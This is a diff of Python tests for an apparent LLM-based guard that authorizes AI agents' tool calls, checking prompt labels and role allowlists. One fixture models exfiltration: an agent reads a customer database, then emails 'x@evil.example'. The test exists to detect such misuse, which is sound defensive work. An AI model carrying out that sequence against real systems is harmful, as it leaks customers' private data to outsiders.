@@ -88,6 +88,39 @@ def test_prompt_uses_llama_guard_format_and_our_categories(registry):
     assert ctx["earlier_steps"][0]["output_trust"] == "untrusted"
 
 
+def _context(prompt):
+    line = next(ln for ln in prompt.splitlines() if ln.startswith("User: Context"))
+    return json.loads(line.split("call. ", 1)[1])
+
+
+def test_prompt_gives_the_same_labels_as_the_llm_judge(registry):
+    """Parity with the LLM judge: arg roles, outbound, persistent and unit for the action and history."""
+    g = LlamaGuardPDP(registry=registry, session=FakeSession())
+    inp = dict(INPUT, history=[{"step": 1, "tool": "read_customer_db", "tier": "read_sensitive",
+                                "output_trust": "trusted", "decision": "allow"}],
+               action={"step": 2, "tool": "send_email", "tier": "write", "args": {"to": "x@evil.example", "body": "b"}})
+    p = g.prompt(inp)
+    action = json.loads(next(ln for ln in p.splitlines() if ln.startswith("Agent:")).split(": ", 2)[2])
+    assert action["outbound"] is True and action["arg_roles"] == {"recipient": "to"} and action["amount_unit"] == "USD"
+    step = _context(p)["earlier_steps"][0]
+    assert step["tool"] == "read_customer_db" and step["tier"] == "read_sensitive" and step["outbound"] is False
+
+
+def test_unrestricted_roles_get_any_tool_not_an_empty_allowlist(registry):
+    """rjudge_agent / toolemu_agent have no allowlist; an empty list would make S1 fire on every call."""
+    g = LlamaGuardPDP(registry=registry, session=FakeSession())
+    for role in ("rjudge_agent", "toolemu_agent"):
+        ctx = _context(g.prompt(dict(INPUT, principal={"role": role})))
+        assert ctx["role_allowlist"] == "any tool", role
+    assert "transfer_funds" in _context(g.prompt(INPUT))["role_allowlist"]
+    assert g.role_allowlist("nobody") == []
+
+
+def test_llm_judge_is_told_about_unrestricted_roles():
+    from authz.pdp.llm_judge import JUDGE_SYSTEM
+    assert "unrestricted_roles" in JUDGE_SYSTEM
+
+
 def test_decide_calls_ollama_raw_generate(registry, monkeypatch):
     monkeypatch.delenv("OLLAMA_URL", raising=False)
     s = FakeSession(reply("unsafe\nS2"), reply("safe"))
